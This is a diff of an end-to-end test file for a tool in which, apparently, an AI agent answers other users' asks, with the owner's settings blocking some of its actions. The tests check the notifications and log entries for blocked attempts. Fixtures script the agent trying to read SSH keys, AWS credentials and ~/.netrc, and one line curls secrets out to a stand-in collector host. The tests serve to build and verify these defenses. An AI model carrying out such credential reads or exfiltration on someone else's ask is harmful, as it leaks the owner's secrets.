@@ -78,10 +78,10 @@ describe("the owner's security tools, end to end", () => {
   });
   const settingsFile = () => path.join(bobDir(), 'settings.json');
   const setBob = (s = settings()) => fs.writeFileSync(settingsFile(), JSON.stringify(s), { mode: 0o600 });
-  const startBob = async () => {
+  const startBob = async (extra = {}) => {
     await stop(bob);
     bobOut = '';
-    bob = spawn(process.execPath, [path.join(ROOT, 'rep.mjs'), 'serve', '--profile', 'bob'], { env: env() });
+    bob = spawn(process.execPath, [path.join(ROOT, 'rep.mjs'), 'serve', '--profile', 'bob'], { env: env(extra) });
     procs.push(bob);
     bob.stdout.on('data', (d) => (bobOut += d));
     bob.stderr.on('data', (d) => (bobOut += d));
@@ -176,7 +176,9 @@ describe("the owner's security tools, end to end", () => {
     await replyTo(m.id);
     const n = await waitFor(() => notes().find((x) => x.type === 'blocked'), 8000, 'the blocked notification');
     assert.equal(n.title, "@alice's ask made your Oby try what you don't allow");
-    assert.equal(n.body, 'Blocked: Read /home/bob/.ssh/id_ed25519; Bash curl https://collector.example/?d=secrets');
+    // the file it tried; of a command or an address, only the program or the host: what it tried to send
+    // out may be what it read, and a notification can go to Slack or a phone (the check has it all)
+    assert.equal(n.body, 'Blocked: Read /home/bob/.ssh/id_ed25519; Bash curl …');
     assert.match(n.link, /#page=you$/);
     assert.match(bobOut, /⚠ blocked: alice's ask made your Oby try what your settings don't allow/);
     const j = JSON.parse((await rep(['security', '--profile', 'bob', '--json', '--no-scan'])).out);
@@ -185,6 +187,48 @@ describe("the owner's security tools, end to end", () => {
     assert.equal(j.blocked.at(-1).from, 'alice');
     const file = path.join(bobDir(), 'security', 'blocked.jsonl');
     assert.equal(fs.statSync(file).mode & 0o777, 0o600);
+    fake.control({ text: 'Here you go.' });
+  });
+
+  test('blocked attempts are told when the answer stops at its time limit or fails too, and one passed on from another ask says so', async () => {
+    const before = notes().filter((x) => x.type === 'blocked').length;
+    // a "minute" is a second: the time limit is 2 s, and the run would take 6
+    setBob({ ...settings(), routing: { default: { runtime: 'claude', model: null, effort: null, timeLimitMin: 2 }, rules: [] } });
+    await startBob({ OBYSPHERE_MINUTE_MS: '1000' });
+    try {
+      fake.control({ text: 'late', sleepMs: 6000, streamDenials: [{ tool_name: 'Read', tool_input: { file_path: '/home/bob/.aws/credentials' } }] });
+      const m = await ask('BLOCK-T probe');
+      assert.match((await replyTo(m.id)).text, /time limit/);
+      const t = await waitFor(() => notes().find((x) => x.type === 'blocked' && /\.aws\/credentials/.test(x.body)), 8000, 'told of the timed-out run');
+      assert.equal(t.body, 'Blocked: Read /home/bob/.aws/credentials');
+      // a run that fails: told too, and the asker reads plain words
+      fake.control({ fail: { claude: 'other' }, streamDenials: [{ tool_name: 'Bash', tool_input: { command: 'cat ~/.netrc' } }] });
+      const e = await ask('BLOCK-E probe');
+      assert.equal((await replyTo(e.id)).text, "I can't answer this one right now.");
+      await waitFor(() => notes().find((x) => x.type === 'blocked' && x.body === 'Blocked: Bash cat …'), 8000, 'told of the failed run');
+      assert.equal(notes().filter((x) => x.type === 'blocked').length, before + 2);
+      const j = JSON.parse((await rep(['security', '--profile', 'bob', '--json', '--no-scan'])).out);
+      assert.deepEqual(j.blocked.slice(-2).map((b) => b.denied), [[{ tool: 'Read', what: '/home/bob/.aws/credentials' }], [{ tool: 'Bash', what: 'cat ~/.netrc' }]], 'the check keeps it all, on this machine');
+    } finally {
+      fake.control({ text: 'Here you go.' });
+      setBob();
+      await startBob();
+    }
+    // an ask alice passes on for someone else (a hop, which waits for him): the asker can't be named
+    const cause = await call('POST', '/api/messages', { tok: token('bob'), body: { channel: 'general', text: 'alice, what do you know?', to: [ids.alice] } });
+    const h = await call('POST', '/api/messages', { tok: token('alice'), body: { channel: 'general', text: 'BLOCK-H passed on', to: [ids.bob], cause: cause.message.id } });
+    assert.equal(h.message.depth, 1);
+    const w = await waitFor(async () => ((await local('GET', '/local/pending')).pending || []).find((x) => x.askId === h.message.id), 10000, 'the hop to wait for him');
+    fake.control({ text: 'Done.', denials: [{ tool_name: 'Read', tool_input: { file_path: '/home/bob/.ssh/id_rsa' } }] });
+    await local('POST', `/local/pending/${w.id}`, { decision: 'answer' });
+    await replyTo(h.message.id);
+    const n = await waitFor(() => notes().find((x) => x.type === 'blocked' && /id_rsa/.test(x.body)), 8000, 'told of the hop');
+    assert.equal(n.body, 'Blocked (an ask @alice passed on for someone else): Read /home/bob/.ssh/id_rsa');
+    const j = JSON.parse((await rep(['security', '--profile', 'bob', '--json', '--no-scan'])).out);
+    assert.equal(j.blocked.at(-1).hop, true);
+    const c = j.checks.find((x) => x.id === 'blocked');
+    assert.match(c.detail, /@alice \(passing on someone else's ask\)/);
+    assert.match(c.fix, /passed on/);
     fake.control({ text: 'Here you go.' });
   });
 
